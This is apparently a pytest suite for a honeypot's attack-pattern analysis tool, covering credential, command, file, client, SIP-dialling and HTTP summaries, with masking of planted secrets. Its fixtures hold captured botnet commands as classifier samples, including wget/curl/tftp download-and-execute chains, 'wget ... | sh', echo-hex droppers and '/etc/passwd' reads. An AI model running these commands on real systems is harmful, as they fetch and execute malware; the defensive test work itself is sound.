"""`attack_patterns` and `bait_trips`: one test file for the questions that used to need SQL.

The payload shapes below are the ones the engines really write (Cowrie JSON for ssh/telnet, the SIP,
HTTP and MySQL engines' `submit_event` payloads), so a change to what an engine records that these
tools read shows up here rather than on a production database.
"""

from __future__ import annotations

import json
import os
from datetime import UTC, datetime, timedelta
from typing import Any

import pytest

os.environ["DATABASE_URL"] = os.environ.get("TEST_DATABASE_URL", "sqlite+aiosqlite:///:memory:")

PLANTED_PASSWORD = "S3cretPlantedPw!"
PLANTED_USER = "deploy_ab12"


@pytest.fixture(autouse=True)
async def setup_db():
    from honeypot_mcp.storage import event_buffer
    from honeypot_mcp.storage.database import close_db, init_db

    event_buffer.reset_for_tests()
    await init_db()
    yield
    event_buffer.reset_for_tests()
    await close_db()


def _now() -> datetime:
    return datetime.now(UTC)


async def _seed(rows: list[tuple[str, str, dict[str, Any], datetime | None]]) -> None:
    """Insert `(event_type, source_ip, payload, timestamp)` alerts (rollups follow automatically)."""
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Alert, AlertSeverity

    async with get_session() as session:
        for event_type, ip, payload, ts in rows:
            session.add(
                Alert(
                    source_ip=ip,
                    event_type=event_type,
                    payload=payload,
                    severity=AlertSeverity.MEDIUM,
                    timestamp=ts or _now(),
                )
            )


async def _token(
    *,
    label: str = "bait",
    created_at: datetime | None = None,
    status: str = "active",
    type_: str = "credential",
    meta: dict[str, Any] | None = None,
    value: str | None = None,
) -> int:
    from honeypot_mcp.storage.database import get_session
    from honeypot_mcp.storage.models import Honeytoken, HoneytokenStatus, HoneytokenType

    if meta is None and type_ == "credential":
        meta = {
            "service": "ssh",
            "credentials": [
                {"username": PLANTED_USER, "password": PLANTED_PASSWORD, "service": "ssh"}
            ],
        }
    async with get_session() as session:
        token = Honeytoken(
            type=HoneytokenType(type_),
            label=label,
            token_value=value or f"{label}-value",
            status=HoneytokenStatus(status),
            token_meta=meta or {},
            created_at=created_at or _now(),
        )
        session.add(token)
        await session.flush()
        return token.id


def _login(user: str, password: str | None, **extra: Any) -> dict[str, Any]:
    payload = {"session": "s1", "protocol": "ssh", "username": user, "sensor": "x", **extra}
    if password is not None:
        payload["password"] = password
    return payload


async def _call(kind: str, **kwargs: Any) -> dict[str, Any]:
    from honeypot_mcp.tools.patterns import attack_patterns

    return await attack_patterns(kind, **kwargs)  # type: ignore[arg-type]


# ── argument handling ─────────────────────────────────────────────────────────


async def test_bad_arguments_are_refused_not_ignored():
    assert "kind must be" in (await _call("nonsense"))["error"]
    assert "since_hours" in (await _call("credentials", since_hours=0))["error"]
    assert "since_hours" in (await _call("credentials", since_hours=-3))["error"]
    assert "not a valid" in (await _call("credentials", source_ip="192.0.2.999"))["error"]
    assert (
        "service 'gopher' is not available"
        in (await _call("credentials", service="gopher"))["error"]
    )
    # A filter the kind cannot honour must not be silently dropped.
    assert "does not take a service filter" in (await _call("http", service="ssh"))["error"]
    assert (
        "does not take source_ip" in (await _call("concentration", source_ip="192.0.2.1"))["error"]
    )


async def test_an_empty_database_answers_instead_of_failing():
    for kind in (
        "credentials",
        "commands",
        "files",
        "clients",
        "sip_dialling",
        "http",
        "concentration",
    ):
        out = await _call(kind)
        assert "error" not in out, (kind, out)
        assert out["count"] == 0
        assert out["note"] == "No matching events in this window.", kind


# ── credentials ───────────────────────────────────────────────────────────────


async def test_credentials_rank_pairs_usernames_passwords_and_split_accepted_from_refused():
    await _token()  # an unrelated planted token must not disturb ordinary rows
    rows: list[tuple[str, str, dict[str, Any], datetime | None]] = []
    for i in range(5):  # root/hi3518 accepted from 3 sources
        rows.append(
            ("telnet_login_success", f"192.0.2.{i % 3 + 1}", _login("root", "hi3518"), None)
        )
    for _ in range(2):
        rows.append(("telnet_login_failed", "192.0.2.9", _login("root", "123456"), None))
    rows.append(("ssh_login_failed", "192.0.2.9", _login("admin", "admin"), None))
    rows.append(
        ("ssh_login_failed", "192.0.2.10", {"username": "root", "fingerprint": "ab:cd"}, None)
    )
    rows.append(
        ("mysql_login_attempt", "198.51.100.1", {"username": "root", "auth_response_hex": ""}, None)
    )
    rows.append(
        ("ftp_login_attempt", "198.51.100.2", {"username": "anonymous", "password": "a@b"}, None)
    )
    await _seed(rows)

    out = await _call("credentials", top=3)

    pair = out["top_pairs"][0]
    assert (pair["username"], pair["password"]) == ("root", "hi3518")
    assert (pair["events"], pair["sources"], pair["accepted"], pair["refused"]) == (5, 3, 5, 0)
    assert pair["services"] == ["telnet"]
    assert len(out["top_pairs"]) == 3, "`top` caps every list"
    users = {u["username"]: u for u in out["top_usernames"]}
    assert users["root"]["events"] == 9  # 5 + 2 telnet, 1 pubkey ssh, 1 mysql
    assert users["root"]["accepted"] == 5 and users["root"]["refused"] == 3
    assert out["distinct"] == {"pairs": 4, "usernames": 3, "passwords": 4, "sources": 7}
    assert out["events_without_plaintext_password"] == 2, "pubkey attempt + mysql scramble"
    services = {s["service"]: s for s in out["services"]}
    assert services["telnet"]["accepted"] == 5 and services["telnet"]["refused"] == 2
    assert services["ssh"]["refused"] == 2
    assert services["mysql"]["attempts"] == 1, "services that never record the outcome are attempts"
    assert services["telnet"]["sources"] == 4
    assert out["count"] == 11
    assert out["scan"]["complete"] is True and out["note"] is None


async def test_a_planted_credential_is_masked_everywhere_and_other_passwords_are_shown():
    tid = await _token()
    revoked = await _token(
        label="old",
        status="revoked",
        meta={
            "credentials": [
                {"username": "old_user", "password": "RetiredPlanted#9", "service": "ssh"}
            ]
        },
    )
    rows: list[tuple[str, str, dict[str, Any], datetime | None]] = [
        # the trip itself carries the plaintext in its payload, as the engines record it
        (
            "honeytoken_triggered_credential_via_ssh_login_success",
            "192.0.2.50",
            _login(PLANTED_USER, PLANTED_PASSWORD),
            None,
        ),
        (
            "ssh_login_failed",
            "192.0.2.51",
            _login("root", PLANTED_PASSWORD),
            None,
        ),  # replayed on a decoy
        ("ssh_login_failed", "192.0.2.52", _login("old_user", "RetiredPlanted#9"), None),
        ("ssh_login_failed", "192.0.2.53", _login("root", "hunter2"), None),
    ]
    await _seed(rows)

    out = await _call("credentials", service="ssh")
    blob = json.dumps(out)

    assert PLANTED_PASSWORD not in blob and "RetiredPlanted#9" not in blob
    assert f"[masked: planted honeytoken #{tid}]" in blob
    assert f"[masked: planted honeytoken #{revoked}]" in blob, (
        "a revoked token's secret is still a secret"
    )
    shown = {p["password"]: p for p in out["top_passwords"]}
    assert "hunter2" in shown and shown["hunter2"]["planted"] is False, (
        "ordinary captures stay visible"
    )
    planted_rows = [p for p in out["top_passwords"] if p["planted"]]
    assert {p["password"] for p in planted_rows} == {
        f"[masked: planted honeytoken #{tid}]",
        f"[masked: planted honeytoken #{revoked}]",
    }
    assert next(s for s in out["services"] if s["service"] == "ssh")["planted_credential_hits"] == 1
    assert out["planted_secrets_masked"] == 2


async def test_credentials_window_source_and_service_filters():
    now = _now()
    await _seed(
        [
            (
                "telnet_login_success",
                "192.0.2.1",
                _login("old", "oldpw"),
                now - timedelta(hours=30),
            ),
            ("telnet_login_success", "192.0.2.1", _login("new", "newpw"), now - timedelta(hours=1)),
            (
                "telnet_login_success",
                "192.0.2.2",
                _login("other", "otherpw"),
                now - timedelta(hours=1),
            ),
            ("ssh_login_failed", "192.0.2.1", _login("sshuser", "sshpw"), now - timedelta(hours=1)),
        ]
    )

    recent = await _call("credentials", since_hours=6)
    assert {u["username"] for u in recent["top_usernames"]} == {"new", "other", "sshuser"}
    assert recent["window"]["hours"] == 6 and recent["window"]["since"]

    whole = await _call("credentials")
    assert "old" in {u["username"] for u in whole["top_usernames"]}

    one = await _call("credentials", source_ip="192.0.2.1", service="telnet")
    assert {u["username"] for u in one["top_usernames"]} == {"old", "new"}
    assert one["filters"] == {"source_ip": "192.0.2.1", "service": "telnet"}

    nothing = await _call("credentials", since_hours=0.01)
    assert nothing["count"] == 0 and nothing["note"]


# ── scan mechanics: slices, budget, parallelism ───────────────────────────────


async def test_slicing_a_scan_does_not_change_its_answer(monkeypatch):
    """The scan cuts an event type into id slices. Whatever the slice size, every event is counted
    once: an off-by-one at a boundary would drop or double a row exactly there."""
    from honeypot_mcp.tools import _scan

    rows = [
        ("telnet_login_success", f"192.0.2.{i % 4 + 1}", _login("root", f"pw{i % 3}"), None)
        for i in range(23)
    ]
    await _seed(rows)
    expected = await _call("credentials", service="telnet", top=10)

    for chunk in (1, 2, 5, 7, 22, 23, 24):
        monkeypatch.setattr(_scan, "_CHUNK_ROWS", chunk)
        out = await _call("credentials", service="telnet", top=10)
        assert out["count"] == 23, chunk
        assert out["top_pairs"] == expected["top_pairs"], chunk
        assert out["distinct"] == expected["distinct"], chunk
        assert out["scan"]["complete"] is True


async def test_an_exhausted_time_budget_returns_the_newest_events_and_says_so(monkeypatch):
    from honeypot_mcp.config import get_settings
    from honeypot_mcp.tools import _scan

    await _seed(
        [("telnet_login_success", "192.0.2.1", _login("root", f"pw{i}"), None) for i in range(10)]
    )
    monkeypatch.setattr(_scan, "_CHUNK_ROWS", 3)
    monkeypatch.setattr(get_settings(), "attack_patterns_time_budget_seconds", 0.0)

    out = await _call("credentials", service="telnet")

    assert out["scan"]["complete"] is False
    assert out["scan"]["events_in_scope"] == 10 and out["scan"]["events_scanned"] < 10
    assert "scan budget" in out["note"] and "attack_patterns_time_budget_seconds" in out["note"]
    # Per-service totals come from the rollups and stay exact even when the scan was cut short.
    assert out["services"][0]["events"] == 10


async def test_a_partial_budget_covers_the_newest_slices_first(monkeypatch):
    from honeypot_mcp.tools import _scan, patterns

    await _seed(
        [
            ("telnet_login_success", "192.0.2.1", _login("root", f"pw{i:02d}"), None)
            for i in range(9)
        ]
    )
    monkeypatch.setattr(_scan, "_CHUNK_ROWS", 3)
    started = {"n": 0}

    def expired(_deadline: float) -> bool:
        # Let exactly one slice start, then report the deadline as passed.
        started["n"] += 1
        return started["n"] > 1

    monkeypatch.setattr(patterns, "_expired", expired)
    out = await _call("credentials", service="telnet", top=20)

    passwords = {p["password"] for p in out["top_passwords"]}
    assert passwords == {"pw06", "pw07", "pw08"}, passwords
    assert out["scan"]["complete"] is False


async def test_parallel_slices_on_a_file_database_match_the_sequential_answer(
    tmp_path, monkeypatch
):
    """An in-memory database is one shared connection, so the suite above runs slices one at a time.
    A file database runs several at once; the answer must not depend on it."""
    from honeypot_mcp.config import get_settings
    from honeypot_mcp.storage.database import close_db, init_db
    from honeypot_mcp.tools import _scan, patterns

    await close_db()
    monkeypatch.setattr(get_settings(), "database_url", f"sqlite+aiosqlite:///{tmp_path / 'p.db'}")
    await init_db()
    await _seed(
        [
            ("telnet_login_success", f"192.0.2.{i % 5 + 1}", _login("root", f"pw{i % 4}"), None)
            for i in range(40)
        ]
    )
    monkeypatch.setattr(_scan, "_CHUNK_ROWS", 4)
    assert patterns._scan_workers() > 1

    out = await _call("credentials", service="telnet", top=10)

    assert out["count"] == 40 and out["scan"]["complete"] is True
    assert {p["password"]: p["events"] for p in out["top_passwords"]} == {
        f"pw{k}": 10 for k in range(4)
    }
    assert out["distinct"]["sources"] == 5


# ── commands ──────────────────────────────────────────────────────────────────

EXEC_PROBE = 'printf "#!/bin/bash\\necho \\"xxxxxx\\"\\n" > filter && chmod +x filter && ./filter && rm -rf filter'
WRITABLE_PROBE = (
    ">/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/tmp/.x&&cd /tmp;"
    "/bin/busybox echo -e '\\x44\\x4b\\x41\\x47\\x4b\\x51'"
)
DOWNLOAD = (
    ">/var/run/.x&&cd /var/run;>/tmp/.x&&cd /tmp;rm -rf i;wget http://203.0.113.5:49383/i "
    "||curl -O http://203.0.113.5:49383/i ||/bin/busybox wget http://203.0.113.5:49383/i; chmod 777 i; ./i"
)


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("system", "shell_menu"),
        ("linuxshell", "shell_menu"),
        ("enable", "shell_menu"),
        ("config terminal", "shell_menu"),
        (EXEC_PROBE, "exec_capability_probe"),
        (WRITABLE_PROBE, "writable_dir_probe"),
        (DOWNLOAD, "download_chain"),
        ("wget http://203.0.113.5/x.sh -O- | sh", "download_chain"),
        ("tftp -g -r bins.sh 203.0.113.9", "download_chain"),
        (
            "/bin/busybox wget;/bin/busybox echo -ne '\\x44\\x4b\\x41\\x47\\x4b\\x51'",
            "echo_hex_dropper",
        ),
        ('echo -e "\\x6F\\x6B"', "echo_hex_dropper"),
        ("uname -s -v -n -r -m", "fingerprint_check"),
        ("cat /proc/cpuinfo | grep name", "fingerprint_check"),
        ("id", "fingerprint_check"),
        ('#!/bin/bash\necho "xxxxxx"\n', "script_body"),
        ("cat /etc/passwd", "other"),
        ("wget", "other"),  # a fetch tool with nothing to fetch is not a download chain
    ],
)
def test_command_classification(command, expected):
    from honeypot_mcp.tools.patterns import classify_command

    assert classify_command(command)[0] == expected, command


def test_url_extraction_finds_each_staging_url_once():
    from honeypot_mcp.tools.patterns import extract_urls

    assert extract_urls(DOWNLOAD) == ["http://203.0.113.5:49383/i"]
    assert extract_urls("tftp -g -r a.sh 203.0.113.9") == ["tftp://203.0.113.9"]
    assert extract_urls("echo hello") == []


async def test_commands_group_by_class_with_events_sources_hosts_and_masked_secrets():
    await _token()
    rows: list[tuple[str, str, dict[str, Any], datetime | None]] = []

    def cmd(event: str, ip: str, text: str, n: int = 1) -> None:
        rows.extend((event, ip, {"session": "s", "input": text}, None) for _ in range(n))

    for word in ("system", "sh", "enable"):
        cmd("telnet_command_input", "192.0.2.1", word, 3)
        cmd("telnet_command_input", "192.0.2.2", word, 1)
    cmd("telnet_command_input", "192.0.2.1", WRITABLE_PROBE, 2)
    cmd("telnet_command_input", "192.0.2.3", DOWNLOAD, 4)
    cmd("telnet_command_input", "192.0.2.4", DOWNLOAD.replace("49383", "1111"), 1)
    cmd("ssh_command_input", "192.0.2.5", EXEC_PROBE, 6)
    cmd("ssh_command_input", "192.0.2.6", EXEC_PROBE, 2)
    cmd("ssh_command_input", "192.0.2.5", "uname -s -v -n -r -m", 5)
    cmd("ssh_command_input", "192.0.2.5", f"echo '{PLANTED_PASSWORD}' | su - root -c id", 1)
    await _seed(rows)

    out = await _call("commands", top=2)
    classes = {c["class"]: c for c in out["classes"]}

    assert classes["shell_menu"]["events"] == 12 and classes["shell_menu"]["sources"] == 2
    assert classes["shell_menu"]["distinct_commands"] == 3
    assert (
        classes["exec_capability_probe"]["events"],
        classes["exec_capability_probe"]["sources"],
    ) == (8, 2)
    assert classes["writable_dir_probe"]["events"] == 2
    assert (classes["download_chain"]["events"], classes["download_chain"]["sources"]) == (5, 2)
    assert classes["fingerprint_check"]["events"] == 5
    top_shell = classes["shell_menu"]["top_commands"]
    assert len(top_shell) == 2 and top_shell[0]["events"] == 4
    assert out["staging_hosts_total"] == 2
    hosts = {h["host"]: h for h in out["staging_hosts"]}
    assert hosts["203.0.113.5:49383"]["events"] == 4 and hosts["203.0.113.5:49383"]["sources"] == 1
    assert hosts["203.0.113.5:49383"]["example_urls"] == ["http://203.0.113.5:49383/i"]
    # The planted password appears inside a captured command (replayed by an attacker): masked.
    assert PLANTED_PASSWORD not in json.dumps(out)
    assert any(
        "[masked: planted honeytoken #" in c["command"] for c in classes["other"]["top_commands"]
    )
    assert out["count"] == 12 + 2 + 5 + 8 + 5 + 1 and out["distinct_sources"] == 6

    ssh_only = await _call("commands", service="ssh")
    assert {c["class"] for c in ssh_only["classes"]} == {
        "exec_capability_probe",
        "fingerprint_check",
        "other",
    }


async def test_command_shapes_collapse_per_bot_variation():
    rows = [
        (
            "telnet_command_input",
            f"192.0.2.{i}",
            {"input": f"/bin/busybox echo -ne '\\x4{i}\\x4{i}\\x4{i}'"},
            None,
        )
        for i in range(1, 6)
    ]
    await _seed(rows)

    out = await _call("commands")

    echo = next(c for c in out["classes"] if c["class"] == "echo_hex_dropper")
    assert echo["distinct_commands"] == 5
    assert echo["top_shapes"][0]["variants"] == 5 and echo["top_shapes"][0]["events"] == 5
    assert echo["top_shapes"][0]["shape"] == "/bin/busybox echo -ne '<hex>'"


# ── files ─────────────────────────────────────────────────────────────────────

SHA_SCRIPT = "af77b643964afd794460d28ab8a11b0ec8790cd5463abfde126613a4f3bccd32"
SHA_BINARY = "5dc4860a4549b00516f1459668cf4255b4c266ddb06730d3623107a6f6377b41"
SHA_UPLOAD = "6d1fe6ab3cd04ca5d1ab790339ee2b6577553bc042af3b7587ece0c195267c9b"
SHA_EMPTY = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"


def _download(sha: str, dest: str, *, url: str | None, message: str) -> dict[str, Any]:
    payload: dict[str, Any] = {
        "session": "s",
        "protocol": "ssh",
        "shasum": sha,
        "outfile": f"var/lib/cowrie/downloads/{sha}",
        "destfile": dest,
        "duplicate": False,
        "message": message,
    }
    if url is not None:
        payload["url"] = url
    return payload


def test_file_origin_separates_a_redirection_from_a_download():
    from honeypot_mcp.tools.patterns import file_origin

    assert file_origin(
        "ssh_file_download", None, "Saved redir contents with SHA-256 ab to x", "/root/f"
    ) == ("written_by_session")
    assert file_origin(
        "ssh_file_download", None, "Saved stdin contents with SHA-256 ab to x", ""
    ) == ("written_by_session")
    assert file_origin(
        "ssh_file_download", "http://203.0.113.5/a.sh", "Downloaded URL (...)", "/tmp/a"
    ) == ("fetched_from_network")
    assert (
        file_origin("ssh_file_upload", None, 'SCP Uploaded file "x"', "/home/pi/x")
        == "uploaded_by_client"
    )
    assert file_origin("ftp_file_download", None, None, None) == "decoy_retrieved"
    assert file_origin("ssh_file_download", None, "something else", None) == "unknown"


async def test_files_by_hash_say_where_each_one_came_from():
    t0 = _now() - timedelta(hours=5)
    rows: list[tuple[str, str, dict[str, Any], datetime | None]] = []
    for i in range(4):  # the attacker's own script saved by a shell redirection, from 2 sources
        rows.append(
            (
                "ssh_file_download",
                f"192.0.2.{i % 2 + 1}",
                _download(
                    SHA_SCRIPT,
                    "/root/filter",
                    url=None,
                    message=f"Saved redir contents with SHA-256 {SHA_SCRIPT} to x",
                ),
                t0 + timedelta(minutes=i),
            )
        )
    rows.append(
        (
            "telnet_file_download",
            "192.0.2.7",
            _download(
                SHA_BINARY,
                "/tmp/bins.sh",
                url="http://203.0.113.5/bins.sh",
                message="Downloaded URL (http://203.0.113.5/bins.sh)",
            ),
            t0,
        )
    )
    rows.append(
        (
            "ssh_file_upload",
            "192.0.2.8",
            {
                "filename": "pXiLUW12",
                "url": "/home/pi/pXiLUW12",
                "shasum": SHA_UPLOAD,
                "destfile": "/home/pi/pXiLUW12",
                "message": 'SCP Uploaded file "pXiLUW12"',
            },
            t0,
        )
    )
    rows.append(
        (
            "ssh_file_upload",
            "192.0.2.8",
            {"filename": "sshd", "shasum": SHA_EMPTY, "message": 'SFTP Uploaded file "sshd" to x'},
            t0,
        )
    )
    rows.append(
        (
            "ftp_file_upload",
            "198.51.100.3",
            {
                "verb": "STOR",
                "filename": "w.txt",
                "size_bytes": 6,
                "sha256": "ab" * 32,
                "preview": "ebtest",
            },
            t0,
        )
    )
    await _seed(rows)

    out = await _call("files")
    by_sha = {f["sha256"]: f for f in out["files"]}

    script = by_sha[SHA_SCRIPT]
    assert (script["events"], script["sources"]) == (4, 2)
    assert script["origin"] == "written_by_session" and script["fetched_from_network"] == 0
    assert script["written_by_session"] == 4 and script["lookup_hash_worthwhile"] is False
    assert script["destination_names"] == ["/root/filter"]
    assert script["first_seen"] < script["last_seen"]
    binary = by_sha[SHA_BINARY]
    assert binary["origin"] == "fetched_from_network" and binary["fetched_from_network"] == 1
    assert (
        binary["source_urls"] == ["http://203.0.113.5/bins.sh"]
        and binary["lookup_hash_worthwhile"] is True
    )
    assert by_sha[SHA_UPLOAD]["origin"] == "uploaded_by_client"
    assert (
        by_sha[SHA_EMPTY]["empty_file"] is True
        and by_sha[SHA_EMPTY]["lookup_hash_worthwhile"] is False
    )
    assert by_sha["ab" * 32]["size_bytes"] == {"min": 6, "max": 6}
    assert out["events_by_origin"] == {
        "written_by_session": 4,
        "fetched_from_network": 1,
        "uploaded_by_client": 3,
    }
    assert out["distinct_hashes"] == 5 and out["count"] == 8
    assert "lookup_hash" in out["next_step"]
    assert out["files"][0]["sha256"] == SHA_SCRIPT, "most-seen first"

    only_ftp = await _call("files", service="ftp")
    assert [f["sha256"] for f in only_ftp["files"]] == ["ab" * 32]


# ── clients ───────────────────────────────────────────────────────────────────


async def test_clients_group_banners_into_families_and_cluster_shared_fingerprints():
    now = _now()
    rows: list[tuple[str, str, dict[str, Any], datetime | None]] = []
    go_hassh, ossh_hassh = "0a07365cc01fa9fc82608ba4019af499", "aaaa1111bbbb2222cccc3333dddd4444"
    for i, ip in enumerate(("192.0.2.1", "192.0.2.2", "192.0.2.3")):
        for rep in range(2):
            session = f"go{i}{rep}"
            rows.append(
                ("ssh_client_version", ip, {"session": session, "version": "SSH-2.0-Go"}, now)
            )
            rows.append(
                (
                    "ssh_client_kex",
                    ip,
                    {"session": session, "hassh": go_hassh, "kexAlgs": ["curve25519-sha256"]},
                    now,
                )
            )
    rows.append(
        (
            "ssh_client_version",
            "192.0.2.4",
            {"session": "o1", "version": "SSH-2.0-OpenSSH_9.6p1 Ubuntu"},
            now,
        )
    )
    rows.append(("ssh_client_kex", "192.0.2.4", {"session": "o1", "hassh": ossh_hassh}, now))
    rows.append(
        (
            "ssh_client_version",
            "192.0.2.5",
            {"session": "p1", "version": "SSH-2.0-PuTTY_Release_0.84"},
            now,
        )
    )
    rows.append(
        ("ssh_client_version", "192.0.2.6", {"session": "b1", "version": "SSH-2.0-zgrab"}, now)
    )
    rows.append(
        (
            "ssh_client_version",
            "192.0.2.7",
            {"session": "n1", "version": "SSH-2.0-Nmap-SSH2-Hostkey"},
            now,
        )
    )
    await _seed(rows)

    out = await _call("clients")

    versions = {v["version"]: v for v in out["versions"]}
    assert (versions["SSH-2.0-Go"]["events"], versions["SSH-2.0-Go"]["sources"]) == (6, 3)
    families = {f["family"]: f for f in out["families"]}
    assert (
        families["Go (x/crypto/ssh)"]["events"] == 6
        and families["Go (x/crypto/ssh)"]["sources"] == 3
    )
    assert {"OpenSSH", "PuTTY", "ZGrab", "Nmap NSE"} <= set(families)
    hassh = {h["hassh"]: h for h in out["hassh"]}
    assert (hassh[go_hassh]["events"], hassh[go_hassh]["sources"]) == (6, 3)
    assert hassh[go_hassh]["family"] == "Go (x/crypto/ssh)"
    # Clustering comes from `fingerprint_clusters`: three sources, one fingerprint.
    assert [c["hassh"] for c in out["clusters"]] == [go_hassh]
    assert out["clusters"][0]["sources"] == 3
    assert out["clusters"][0]["client_banners"][0]["banner"] == "SSH-2.0-Go"
    # PuTTY, zgrab and nmap sent a banner and never a key exchange.
    assert out["banner_only_sources"]["count"] == 3

    single = await _call("clients", source_ip="192.0.2.4")
    assert single["clusters"] == [] and "omitted" in single["clusters_note"]
    assert [v["version"] for v in single["versions"]] == ["SSH-2.0-OpenSSH_9.6p1 Ubuntu"]


def test_client_family_names():
    from honeypot_mcp.tools.patterns import client_family

    assert client_family("SSH-2.0-Go") == "Go (x/crypto/ssh)"
    assert client_family("SSH-2.0-libssh2_1.10.0") == "libssh2"
    assert client_family("SSH-2.0-libssh_0.9.6") == "libssh"
    assert client_family("SSH-2.0-paramiko_3.4.0") == "paramiko"
    assert client_family("SSH-2.0-selftest_30f130") == "other"


# ── sip_dialling ──────────────────────────────────────────────────────────────

# A fictional number: country code 49, last two digits 78. Nothing in a result may contain more of it.
NUMBER = "493012345678"


async def test_sip_dialling_reduces_strings_to_a_masked_destination_and_prefix_variants():
    rows: list[tuple[str, str, dict[str, Any], datetime | None]] = []

    def dial(ip: str, number: str, n: int = 1, event: str = "sip_toll_fraud_attempt") -> None:
        rows.extend((event, ip, {"method": "INVITE", "dialled": number}, None) for _ in range(n))

    for prefix, n in (("00", 3), ("0011", 2), ("*00", 1), ("00+", 1)):
        dial("192.0.2.1", prefix + NUMBER, n)
    dial("192.0.2.2", "00" + NUMBER, 2)  # a second source, same destination
    dial("192.0.2.3", "0088212345678", 4)  # one string only: the exit prefix is stripped
    for prefix in ("9011", "0011", "00011"):  # the leftover of 011 must not become the country code
        dial("192.0.2.4", prefix + "972598112101")
    dial("192.0.2.5", "100", 3, event="sip_invite")  # an extension, not a phone number
    await _seed(rows)

    out = await _call("sip_dialling")
    blob = json.dumps(out)

    assert NUMBER not in blob and NUMBER[2:] not in blob, "the destination number must never appear"
    assert "972598112101" not in blob and "12345678" not in blob
    sources = {s["source_ip"]: s for s in out["sources"]}
    first = sources["192.0.2.1"]
    assert first["events"] == 7 and first["distinct_dialled_strings"] == 4
    dest = first["destinations"][0]
    assert dest["destination_masked"] == "+49********78"
    assert dest["country_code_guess"] == "+49" and dest["country_guess"] == "Germany"
    assert dest["kind"] == "phone_number"
    prefixes = {p["prefix"]: p["events"] for p in dest["prefix_variants"]}
    assert prefixes == {"00": 3, "0011": 2, "*00": 1, "00+": 1}
    assert dest["prefix_variant_count"] == 4
    assert sources["192.0.2.3"]["destinations"][0]["destination_masked"] == "+882******78"
    assert sources["192.0.2.4"]["destinations"][0]["destination_masked"] == "+972*******01"
    assert sources["192.0.2.4"]["destinations"][0]["country_guess"] == "Israel"
    ext = sources["192.0.2.5"]["destinations"][0]
    assert ext["kind"] == "extension" and ext["destination_masked"] == "100"
    shared = {d["destination_masked"]: d for d in out["destinations"]}
    assert shared["+49********78"]["sources"] == 2 and shared["+49********78"]["events"] == 9
    assert "100" not in shared, "an extension is not a destination worth ranking"
    assert out["events_by_type"] == {"sip_toll_fraud_attempt": 7 + 2 + 4 + 3, "sip_invite": 3}
    assert out["sources_by_type"]["sip_toll_fraud_attempt"] == 4
    assert out["extension_dial_events"] == 3
    assert "third part" in out["privacy"]


def test_phone_number_masking_and_country_codes():
    from honeypot_mcp.tools.patterns import calling_code, mask_number, split_dialled

    assert mask_number("12892271019") == "+1********19"
    assert mask_number("421232229865") == "+421*******65"
    assert mask_number("100") == "100"  # an extension
    assert mask_number("9999999999") == "********99", (
        "no known country code: only the last two digits"
    )
    assert calling_code("442039966107") == "44" and calling_code("882123456") == "882"
    assert calling_code("0123") is None
    groups = split_dialled(["00" + NUMBER, "0011" + NUMBER, "9011" + NUMBER])
    assert [g["number"] for g in groups] == [NUMBER]


# ── http ──────────────────────────────────────────────────────────────────────


def _http(path: str, agent: str, **extra: Any) -> dict[str, Any]:
    return {"method": "GET", "path": path, "user_agent": agent, "headers": {}, **extra}


async def test_http_summary_lists_paths_agents_categories_and_env_probes():
    rows: list[tuple[str, str, dict[str, Any], datetime | None]] = []
    for i in range(6):
        rows.append(
            ("http_active_recon", f"192.0.2.{i + 1}", _http("/.env", "l9explore/1.2.2"), None)
        )
    rows.append(
        (
            "http_decoy_served",
            "192.0.2.1",
            _http("/.env", "l9explore/1.2.2", decoy_target="/.env"),
            None,
        )
    )
    rows.append(
        (
            "http_decoy_served",
            "192.0.2.2",
            _http("/.aws/credentials", "curl/8", decoy_target="/.aws/credentials"),
            None,
        )
    )
    rows.append(("http_active_recon", "192.0.2.3", _http("/backend/.env", "curl/8"), None))
    rows.append(("http_probe", "192.0.2.4", _http("/", "Mozilla/5.0"), None))
    rows.append(
        (
            "http_exploit_attempt",
            "192.0.2.5",
            _http("/x", "zgrab", exploit_categories=["path_traversal", "lfi_rfi"]),
            None,
        )
    )
    rows.append(
        (
            "http_exploit_attempt",
            "192.0.2.6",
            _http("/y", "zgrab", exploit_categories=["path_traversal"]),
            None,
        )
    )
    rows.append(
        (
            "http_credential_submit",
            "192.0.2.7",
            _http(
                "/admin/login", "curl/8", post_data={"username": "a", "password": PLANTED_PASSWORD}
            ),
            None,
        )
    )
    await _token()
    await _seed(rows)

    out = await _call("http", top=3)

    assert out["events_by_type"]["http_active_recon"] == 7 and out["distinct_sources"] == 7
    assert out["top_paths"][0] == {"path": "/.env", "events": 7, "sources": 6}
    agents = {a["user_agent"]: a for a in out["top_user_agents"]}
    assert agents["l9explore/1.2.2"]["events"] == 7
    categories = {c["category"]: c for c in out["exploit_categories"]}
    assert (categories["path_traversal"]["events"], categories["path_traversal"]["sources"]) == (
        2,
        2,
    )
    assert categories["lfi_rfi"]["events"] == 1
    assert {d["decoy_target"] for d in out["decoy_hits"]} == {"/.env", "/.aws/credentials"}
    assert out["env_file_probes"]["events"] == 8 and out["env_file_probes"]["sources"] == 6
    assert out["env_file_probes"]["distinct_paths"] == 2
    assert PLANTED_PASSWORD not in json.dumps(out)


# ── concentration ─────────────────────────────────────────────────────────────


async def test_concentration_reports_floods_the_long_tail_and_days():
    day1 = datetime(2026, 9, 1, 10, 0, tzinfo=UTC)
    day2 = day1 + timedelta(days=1)
    rows: list[tuple[str, str, dict[str, Any], datetime | None]] = []
    rows += [("sip_register_attempt", "192.0.2.1", {}, day1)] * 50
    rows += [("sip_register_attempt", "192.0.2.2", {}, day2)] * 30
    rows += [("telnet_session_connect", "192.0.2.3", {}, day2)] * 11
    rows += [
        ("ssh_session_connect", f"198.51.100.{i}", {}, day1) for i in range(1, 10)
    ]  # 9 one-offs
    rows += [("ssh_session_connect", "203.0.113.1", {}, day2)] * 10  # exactly 10: still the tail
    await _seed(rows)

    out = await _call("concentration", top=2)

    assert out["total_events"] == 50 + 30 + 11 + 9 + 10 and out["total_sources"] == 13
    assert [r["source_ip"] for r in out["top_sources"]] == ["192.0.2.1", "192.0.2.2"]
    assert out["top_sources"][0]["share_pct"] == round(100 * 50 / 110, 2)
    assert out["top_sources"][1]["cumulative_share_pct"] == round(100 * 80 / 110, 2)
    assert out["share_of_events_in_top_n_pct"] == {"n": 2, "share_pct": round(100 * 80 / 110, 2)}
    tail = out["sources_with_10_or_fewer_events"]
    assert tail["sources"] == 10 and tail["events"] == 19
